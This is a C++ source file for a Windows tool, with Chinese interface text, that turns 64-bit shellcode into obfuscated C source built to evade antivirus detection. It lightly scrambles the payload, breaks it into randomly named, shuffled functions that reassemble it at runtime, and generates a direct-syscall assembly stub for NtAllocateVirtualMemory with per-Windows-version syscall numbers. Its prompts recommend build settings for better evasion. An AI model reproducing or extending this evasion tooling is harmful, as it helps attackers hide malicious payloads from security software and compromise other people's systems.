
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <vector>

#define GENERATE_HEAD_FILE_PATH "Generate.h"
#define GENERATE_ASM_FILE_PATH "Generate.asm"
#define COMMON_FILE_PATH "common"
#define SBAV_ROL4(v) (v << 4 | v >> 4)



typedef struct _SHELLCODEFUNC
{
    char FunctionsName[20];

    unsigned char *Data;
    size_t DataSize;
    size_t Offset;
} SHELLCODEFUNC;

enum TargetOsVersions { OS_WIN7, OS_WIN8, OS_WIN8_1, OS_WIN10, OS_AUTO };

char lpszShellcodePath[MAX_PATH] = { 0 };
unsigned char *Shellcode = NULL;
DWORD ShellcodeSize = 0;
FILE *HeadFileGenerate = NULL;
FILE *AsmFileGenerate = NULL;
int TargetOsVersion;
char Chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
std::vector<SHELLCODEFUNC> ShellcodeFuncs;

void Welcome()
{
    FILE *Logo = NULL;
    Logo = fopen("logo", "r");    
    char lineBuffer[1000];
    while (fgets(lineBuffer, 1000, Logo))
    {
        printf("%s", lineBuffer);
    }
    fclose(Logo);
    printf("\n");
    printf("本工具支持将64位shellcode转换成C语言源码，你可以将生成的源码添加到任意VC++项目中\n");
    printf("为了达到更好的免杀效果，建议对项目进行以下设置：\n");
    printf("Release版本编译\n");
    printf("链接器 -> 清单文件 -> 生成清单 -> 否\n");
    printf("链接器 -> 调试 -> 生成调试信息 -> 否\n");
    printf("清单工具 -> 输入和输出 -> 嵌入清单 -> 否\n\n");
}

void ReadShellcode()
{
    printf("请输入要免杀的shellcode二进制文件路径：");
    scanf("%s", lpszShellcodePath);

    HANDLE hShellcode = CreateFileA(lpszShellcodePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hShellcode)
    {
        printf("打开shellcode文件失败\n");
        exit(1);
    }
    ShellcodeSize = GetFileSize(hShellcode, NULL);
    Shellcode = (unsigned char *)VirtualAlloc(NULL, ShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    DWORD lpNumberOfBytesRead;
    ReadFile(hShellcode, Shellcode, ShellcodeSize, &lpNumberOfBytesRead, NULL);

    printf("shellcode 大小：%d 字节\n", ShellcodeSize);
}

void ReverseEncrypt(unsigned char *Data, unsigned long Length)
{
    unsigned char temp;
    for (unsigned long i = 0; i < Length; i++)
    {
        temp = Data[i];
        Data[i] = Data[Length - i - 1];
        Data[Length - i - 1] = temp;
        Data[i] = SBAV_ROL4(Data[i]);
        Data[Length - i - 1] = SBAV_ROL4(Data[Length - i - 1]);
    }
}

void GenerateAsm()
{
    fprintf(AsmFileGenerate, "option casemap : none\n");
    fprintf(AsmFileGenerate, ".data\n");
    fprintf(AsmFileGenerate, "EXTERN SBAV_NtAllocateVirtualMemorySyscallNumber : DWORD\n");
    fprintf(AsmFileGenerate, ".code\n");
    fprintf(AsmFileGenerate, "SBAV_NtAllocateVirtualMemory PROC\n");
    fprintf(AsmFileGenerate, "mov eax, SBAV_NtAllocateVirtualMemorySyscallNumber\n");
    fprintf(AsmFileGenerate, "push rcx\n");
    fprintf(AsmFileGenerate, "pop r10\n");
    fprintf(AsmFileGenerate, "syscall\n");
    fprintf(AsmFileGenerate, "ret\n");
    fprintf(AsmFileGenerate, "SBAV_NtAllocateVirtualMemory ENDP\n");
    fprintf(AsmFileGenerate, "END\n");
}

void GenerateGlobalVariable()
{
    fprintf(HeadFileGenerate, "#include <windows.h>\n\n");
    fprintf(HeadFileGenerate, "#define SBAV_ROL4(v) (v << 4 | v >> 4)\n\n");

    fprintf(HeadFileGenerate, "unsigned char *SBAV_Shellcode = NULL;\n\n");

    fprintf(HeadFileGenerate, "DWORD SBAV_ShellcodeSize = %d;\n\n", ShellcodeSize);

    if (TargetOsVersion == OS_WIN7)
    {
        fprintf(HeadFileGenerate, "EXTERN_C DWORD SBAV_NtAllocateVirtualMemorySyscallNumber = 0x15;\n");
    }
    else if (TargetOsVersion == OS_WIN8)
    {
        fprintf(HeadFileGenerate, "EXTERN_C DWORD SBAV_NtAllocateVirtualMemorySyscallNumber = 0x16;\n");
    }
    else if (TargetOsVersion == OS_WIN8_1)
    {
        fprintf(HeadFileGenerate, "EXTERN_C DWORD SBAV_NtAllocateVirtualMemorySyscallNumber = 0x17;\n");
    }
    else if (TargetOsVersion == OS_WIN10)
    {
        fprintf(HeadFileGenerate, "EXTERN_C DWORD SBAV_NtAllocateVirtualMemorySyscallNumber = 0x18;\n");
    }
    else
    {
        fprintf(HeadFileGenerate, "#define OS_AUTO_DETECT\n");
        fprintf(HeadFileGenerate, "EXTERN_C DWORD SBAV_NtAllocateVirtualMemorySyscallNumber = 0x0;\n");
    }
}

void GenerateCommon()
{
    FILE *FileCommon = fopen(COMMON_FILE_PATH, "r");
    if (FileCommon == NULL)
    {
        printf("读取common文件失败\n");
        exit(1);
    }
    char lineBuffer[1000];
    while (fgets(lineBuffer, 1000, FileCommon))
    {
        fprintf(HeadFileGenerate, "%s", lineBuffer);
    }
    fclose(FileCommon);
}

void GenerateShellcodeFunctions()
{
    DWORD BytesWritten = 0;
    DWORD CurrentOffset = 0;
    DWORD BytesInThisFunction = rand() % 32 + 32;
    DWORD dwFunctionCount = 0;

    // 拆分shellcode + 函数声明
    while (ShellcodeSize != BytesWritten)
    {
        SHELLCODEFUNC ShellcodeFunc;

        if (BytesInThisFunction > ShellcodeSize - BytesWritten)
        {
            BytesInThisFunction = ShellcodeSize - BytesWritten;
        }

        ShellcodeFunc.DataSize = BytesInThisFunction;
        ShellcodeFunc.Data = (unsigned char *)malloc(BytesInThisFunction);
        ShellcodeFunc.Offset = CurrentOffset;
        memcpy(ShellcodeFunc.Data, Shellcode + CurrentOffset, BytesInThisFunction);
        memset(ShellcodeFunc.FunctionsName, 0, 20);
        for (int i = 0; i < 19; i++)
        {
            ShellcodeFunc.FunctionsName[i] = Chars[rand() % 51];
        }
        ShellcodeFuncs.push_back(ShellcodeFunc);

        fprintf(HeadFileGenerate, "void %s();\n", ShellcodeFunc.FunctionsName);

        CurrentOffset += BytesInThisFunction;
        BytesWritten += BytesInThisFunction;
        dwFunctionCount++;
        BytesInThisFunction = rand() % 32 + 32;
    }

    if (dwFunctionCount != ShellcodeFuncs.size())
    {
        printf("错误：dwFunctionCount != ShellcodeFuncs.size()\n");
        exit(1);
    }
    printf("共有 %d 个函数\n", ShellcodeFuncs.size());

    // 打乱顺序
    for (size_t i = 0; i < dwFunctionCount; i++)
    {
        int r1 = rand() % dwFunctionCount;        
        std::swap(ShellcodeFuncs[i], ShellcodeFuncs[r1]);
    }

    // 生成shellcode函数源码
	size_t NextIndex = 1;
	for (size_t i = 0; i < dwFunctionCount; i++)
	{
		fprintf(HeadFileGenerate, "void %s()\n{\n", ShellcodeFuncs[i].FunctionsName);
		fprintf(HeadFileGenerate, "\tunsigned char Data[%d] = {", ShellcodeFuncs[i].DataSize);

		for (size_t j = 0; j < ShellcodeFuncs[i].DataSize; j++)
		{
			fprintf(HeadFileGenerate, "0x%02x, ", Shellcode[j + ShellcodeFuncs[i].Offset]);
		}
		fprintf(HeadFileGenerate, "};\n");

        fprintf(HeadFileGenerate, "\tmemcpy(SBAV_Shellcode + %d, Data, %d);\n", ShellcodeFuncs[i].Offset, ShellcodeFuncs[i].DataSize);

        int SubCount = rand() % 5;

        // 如果已经是最后一个函数，要保证把剩余的函数都调用一次
        if (i == dwFunctionCount - 1 && NextIndex != dwFunctionCount)
        {
            SubCount = dwFunctionCount - NextIndex;
        }
        
		for (int k = 0; k < SubCount; k++)
		{
			if (NextIndex == dwFunctionCount)
			{
				continue;
			}
			fprintf(HeadFileGenerate, "\t%s();\n", ShellcodeFuncs[NextIndex++].FunctionsName);
		}

		fprintf(HeadFileGenerate, "}\n");
	}

    fprintf(HeadFileGenerate, "void SBAV_InitShellcode()\n{\n");
    
    fprintf(HeadFileGenerate, "\t%s();\n", ShellcodeFuncs[0].FunctionsName);

    fprintf(HeadFileGenerate, "}\n");
}

void OpenNotepad()
{
    char lpszHeadFile[MAX_PATH + 10] = "notepad ";
    strcat(lpszHeadFile, GENERATE_HEAD_FILE_PATH);
    char lpszAsmFile[MAX_PATH + 10] = "notepad ";
    strcat(lpszAsmFile, GENERATE_ASM_FILE_PATH);
    STARTUPINFOA si1 = { 0 };
    si1.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi1 = { 0 };
    STARTUPINFOA si2 = { 0 };
    si2.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi2 = { 0 };
    CreateProcessA(NULL, lpszHeadFile, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si1, &pi1);
    CreateProcessA(NULL, lpszAsmFile, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2);
}

int main()
{
    srand((unsigned int)time(0));

    Welcome();

    ReadShellcode();

    ReverseEncrypt(Shellcode, ShellcodeSize);

    HeadFileGenerate = fopen(GENERATE_HEAD_FILE_PATH, "w+");
    AsmFileGenerate = fopen(GENERATE_ASM_FILE_PATH, "w+");
    
    printf("[0] WIN7\n");
    printf("[1] WIN8\n");
    printf("[2] WIN8.1\n");
    printf("[3] WIN10\n");
    printf("[4] 运行时自动识别\n");
    printf("请选择目标操作系统版本：");
    scanf("%d", &TargetOsVersion);

    GenerateAsm();

    GenerateGlobalVariable();
    
    GenerateCommon();

    GenerateShellcodeFunctions();

    fclose(HeadFileGenerate);
    fclose(AsmFileGenerate);

    OpenNotepad();

    return 0;
}

